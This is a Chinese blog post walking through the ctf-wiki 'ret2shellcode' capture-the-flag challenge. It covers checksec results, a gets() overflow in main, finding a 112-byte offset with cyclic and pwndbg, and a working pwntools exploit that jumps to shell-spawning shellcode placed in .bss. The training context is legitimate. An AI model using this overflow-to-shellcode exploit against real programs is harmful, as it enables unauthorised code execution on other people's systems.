---
layout: post
title: CTF-PWN实例0（ret2shellcode）
categories: 
 - CTF
 - PWN
 - 二进制
permalink: /pwn/0
nocomments: true  # Disable the comment box. This is EasyBook feature
typora-root-url: ..\_site
---

# CTF-PWN实例0（ret2shellcode）

## 题目地址：

https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2shellcode

## 程序保护：

```shell
$ checksec ret2shellcode
```

```shell
 	Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

未开启任何保护。但是第一次写实例，简单介绍一下这几个保护。

首先Stack保护措施，如果开启了，会在栈中返回地址前放一个随机值，如果被覆盖程序就会报错退出。

NX保护是no execution，如果 开启了就不能让IP寄存器指向堆和栈。等同于不能执行推或栈中的指令。

## 解题：

### 一、IDA分析程序溢出点

IDA分析main函数：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [sp+1Ch] [bp-64h]@1

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets((char *)&v4);
  strncpy(buf2, (const char *)&v4, 0x64u);
  printf("bye bye ~");
  return 0;
}
```

发现使用了gets()函数，gets()函数会不断地向v4中写入，只有遇到\00才会停止，这样在栈中就会溢出覆盖掉返回地址。

### 二、cyclic和pwndbg判断偏移量

```shell
$ cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
$ gdb ret2shellcode
........
pwndbg> r
Starting program: /home/dtuncle/ctf-challenges/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode 
No system for you this time !!!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
bye bye ~
Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────[ REGISTERS ]────────────────────────────────────
 EAX  0x0
 EBX  0x0
 ECX  0xffffffff
 EDX  0xf7fb6870 (_IO_stdfile_1_lock) ◂— 0
 EDI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 ESI  0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
 EBP  0x62616163 ('caab')
 ESP  0xffffcfa0 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
 EIP  0x62616164 ('daab')
─────────────────────────────────────[ DISASM ]──────────────────────────────────────
Invalid address 0x62616164

──────────────────────────────────────[ STACK ]──────────────────────────────────────
00:0000│ esp  0xffffcfa0 ◂— 'eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
01:0004│      0xffffcfa4 ◂— 'faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
02:0008│      0xffffcfa8 ◂— 'gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
03:000c│      0xffffcfac ◂— 'haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
04:0010│      0xffffcfb0 ◂— 'iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
05:0014│      0xffffcfb4 ◂— 'jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
06:0018│      0xffffcfb8 ◂— 'kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
07:001c│      0xffffcfbc ◂— 'laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
────────────────────────────────────[ BACKTRACE ]────────────────────────────────────
 ► f 0 62616164
   f 1 62616165
   f 2 62616166
   f 3 62616167
   f 4 62616168
   f 5 62616169
   f 6 6261616a
   f 7 6261616b
   f 8 6261616c
   f 9 6261616d
   f 10 6261616e
Program received signal SIGSEGV (fault address 0x62616164)
pwndbg> quit
$ cyclic -l 0x62616164
112
```

这样就可以直接定位到偏移量为112.

### 三、编写EXP

思路：

首先这里能直接覆盖返回地址，然后就让返回地址被覆盖成shellcode地址。重点在于shellcode地址，这里搜索函数名没有system()所以不能直接利用程序内部的函数。这里就需要 写入shellcode，前面保护机制中NX是关闭的，所以我们可以选择将shellcode写入.bss段。然后让返回地址指向shellcode。

先用ida确认.bss段的地址（.bss一般程序会分陪比较大空间不用担心超出空间）

v4在.bss段的地址

```c
.bss:0804A080                 public buf2
.bss:0804A080 ; char buf2[100]
.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B\u8o
.bss:0804A080 _bss            ends
```

exp代码：

```python
#!/usr/bin/env python
# coding=utf-8
from pwn import *

p = process('./ret2shellcode')

p.sendline(asm(shellcraft.sh()).ljust(112,'a')+p32(0x0804a080)) #这里是将shellcode和a填充到栈中，总长度为112

p.interactive()
```

## 总结

PWN两大难点：确定溢出点，如何利用。这里主要注意linxu下的一些保护措施，这里只介绍了stack和nx。其他的遇到后会介绍，并且对应保护措施开启后如何利用写exp。然后就是简单的用cyclic确认偏移量。